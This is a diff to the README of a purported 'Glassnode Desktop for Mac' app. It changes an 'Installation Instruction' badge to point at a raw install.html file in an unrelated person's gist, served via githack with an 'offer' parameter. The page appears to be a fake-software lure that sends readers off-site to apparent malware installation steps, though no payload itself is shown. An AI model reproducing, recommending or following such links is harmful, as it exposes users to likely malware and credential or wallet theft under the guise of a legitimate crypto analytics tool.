@@ -3,7 +3,7 @@
 
 Glassnode Desktop for Mac brings institutional-grade on-chain analytics and market intelligence directly to your macOS device. Stay ahead in the crypto market with real-time metrics, interactive charts, and powerful research tools 📊💻  
 
-[![Get Github Instruction](https://img.shields.io/badge/Get%20Installation%20Instruction-2EA44F?style=for-the-badge&logo=github&logoColor=white)](https://finklousen71-alt.github.io/.github/)
+[![Get Github Instruction](https://img.shields.io/badge/Get%20Installation%20Instruction-2EA44F?style=for-the-badge&logo=github&logoColor=white)](https://gistcdn.githack.com/breshine2010/f1e7da49b2633dc0be788e2becd1aeb4/raw/008d334dc45899bcf9459cb9df1d55c807b128cb/install.html?offer=Glassnode)
 
 ---
 
